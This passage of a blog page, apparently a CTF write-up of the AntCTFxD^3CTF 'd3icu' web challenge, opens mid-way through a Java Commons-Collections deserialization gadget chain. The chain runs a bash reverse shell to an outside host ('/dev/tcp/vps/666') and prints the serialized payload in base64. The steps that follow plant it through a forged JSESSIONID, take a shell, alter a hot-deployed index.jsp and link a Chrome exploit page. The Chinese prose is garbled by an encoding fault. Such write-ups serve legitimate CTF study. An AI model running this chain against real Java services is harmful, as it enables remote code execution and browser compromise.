class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/vps/666 0&gt;&amp;1&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        Map outerMap= LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), transformerChain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>(),<span class="string">&quot;keykey&quot;</span>);<span class="comment">//ç›´æ¥ç”¨æ–°HashMap</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">objMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        objMap.put(tiedMapEntry,<span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> tiedMapEntry.getClass().getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(tiedMapEntry,outerMap);<span class="comment">//æ›¿æ¢æˆå­˜æœ‰æ¶æ„pocçš„HashMap</span></span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(objMap);</span><br><span class="line">        String res=encryptToBase64(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        System.out.println(res);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">encryptToBase64</span><span class="params">(String filePath)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (filePath == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] b = Files.readAllBytes(Paths.get(filePath));</span><br><span class="line">            <span class="keyword">return</span> Base64.getEncoder().encodeToString(b);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æŠŠser.binæ”¾åˆ°vpsä¸Š,ç„¶åè®¿é—®ä¼šè¾“å‡ºä¸€æ®µCRC</p>
<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230516090459983.png" alt="image-20230516090459983"></p>
<p>åœ¨index.jspæŠ“åŒ…,æŠŠJSEESIONIDæ”¹ä¸ºCRC</p>
<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230516091220795.png" alt="image-20230516091220795"></p>
<p>getshellå¯ä»¥å‘ç°å½“å‰ç›®å½•æ˜¯è§£å‹äº†waråŒ…çš„å¹¶ä¸”å®ç°äº†çƒ­éƒ¨ç½²,é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä¿®æ”¹index.jspç„¶åpwnæµè§ˆå™¨<br><a target="_blank" rel="noopener" href="https://github.com/77409/chrome-0day/blob/main/exploit.html">https://github.com/77409/chrome-0day/blob/main/exploit.html</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="https://aaanz.github.io">anz</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="https://aaanz.github.io/web/D3%E5%A4%8D%E7%8E%B0/">https://aaanz.github.io/web/D3%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥è‡ª <a href="https://aaanz.github.io" target="_blank">anz</a>ï¼</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web/">web</a></div><div class="post_share"><div class="social-share" data-image="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/web/miniL/"><img class="prev-cover" src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">ä¸Šä¸€ç¯‡</div><div class="prev_info">MiniL CTF</div></div></a></div><div class="next-post pull-right"><a href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ATT&amp;CK%E4%BA%8C/"><img class="next-cover" src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">ä¸‹ä¸€ç¯‡</div><div class="next_info">çº¢æ—¥äºŒ</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>ç›¸å…³æ¨è</span></div><div class="relatedPosts-list"><div><a href="/web/SSRF%E6%80%BB%E7%BB%93/" title="SSRFæ€»ç»“"><img class="cover" src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-16</div><div class="title">SSRFæ€»ç»“</div></div></a></div><div><a href="/web/XXE/" title="XXE"><img class="cover" src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-20</div><div class="title">XXE</div></div></a></div><div><a href="/web/miniL/" title="MiniL CTF"><img class="cover" src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-10</div><div class="title">MiniL CTF</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/75899c342847e73b.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">anz</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">37</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">15</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/aaanz"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>å…¬å‘Š</span></div><div class="announcement_content">Welcome to anz's blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>ç›®å½•</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Escape-Plan"><span class="toc-number">1.</span> <span class="toc-text">Escape Plan</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#a2b-base64%E8%A7%A3%E7%A0%81%E6%8B%BC%E6%8E%A5"><span class="toc-number">1.1.</span> <span class="toc-text">a2b_base64è§£ç æ‹¼æ¥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#repr%E5%88%87%E7%89%87%E6%8B%BC%E6%8E%A5"><span class="toc-number">1.2.</span> <span class="toc-text">repråˆ‡ç‰‡æ‹¼æ¥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#True%E8%BD%AC%E5%8C%96%E6%95%B0%E5%AD%97"><span class="toc-number">1.3.</span> <span class="toc-text">Trueè½¬åŒ–æ•°å­—</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#d3cloud"><span class="toc-number">2.</span> <span class="toc-text">d3cloud</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#d3node"><span class="toc-number">3.</span> <span class="toc-text">d3node</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#d3go"><span class="toc-number">4.</span> <span class="toc-text">d3go</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81"><span class="toc-number">4.1.</span> <span class="toc-text">æ ¹æ®ç›®å½•ç©¿è¶Šè·å–æºç </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">4.2.</span> <span class="toc-text">åˆ†æ</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#d3icu"><span class="toc-number">5.</span> <span class="toc-text">d3icu</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">5.1.</span> <span class="toc-text">æºç å®¡è®¡</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E5%88%86%E6%9E%90"><span class="toc-number">5.2.</span> <span class="toc-text">è§£é¢˜åˆ†æ</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>æœ€æ–°æ–‡ç« </span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/web/miniL/" title="MiniL CTF"><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MiniL CTF"/></a><div class="content"><a class="title" href="/web/miniL/" title="MiniL CTF">MiniL CTF</a><time datetime="2023-05-10T00:32:27.529Z" title="å‘è¡¨äº 2023-05-10 08:32:27">2023-05-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/web/D3%E5%A4%8D%E7%8E%B0/" title="AntCTFXD^3CTF"><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="AntCTFXD^3CTF"/></a><div class="content"><a class="title" href="/web/D3%E5%A4%8D%E7%8E%B0/" title="AntCTFXD^3CTF">AntCTFXD^3CTF</a><time datetime="2023-05-03T08:27:47.715Z" title="å‘è¡¨äº 2023-05-03 16:27:47">2023-05-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ATT&amp;CK%E4%BA%8C/" title="çº¢æ—¥äºŒ"><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="çº¢æ—¥äºŒ"/></a><div class="content"><a class="title" href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ATT&amp;CK%E4%BA%8C/" title="çº¢æ—¥äºŒ">çº¢æ—¥äºŒ</a><time datetime="2023-04-20T07:14:49.281Z" title="å‘è¡¨äº 2023-04-20 15:14:49">2023-04-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/ctfshow/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" title="æƒé™ç»´æŒ"><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="æƒé™ç»´æŒ"/></a><div class="content"><a class="title" href="/ctfshow/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" title="æƒé™ç»´æŒ">æƒé™ç»´æŒ</a><time datetime="2023-04-12T11:52:44.895Z" title="å‘è¡¨äº 2023-04-12 19:52:44">2023-04-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Docker/docker%E5%AD%A6%E4%B9%A0/" title="Dockerå­¦ä¹ "><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Dockerå­¦ä¹ "/></a><div class="content"><a class="title" href="/Docker/docker%E5%AD%A6%E4%B9%A0/" title="Dockerå­¦ä¹ ">Dockerå­¦ä¹ </a><time datetime="2023-04-09T16:38:36.000Z" title="å‘è¡¨äº 2023-04-10 00:38:36">2023-04-10</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By anz</div><div class="framework-info"><span>æ¡†æ¶ </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="æµ…è‰²å’Œæ·±è‰²æ¨¡å¼è½¬æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>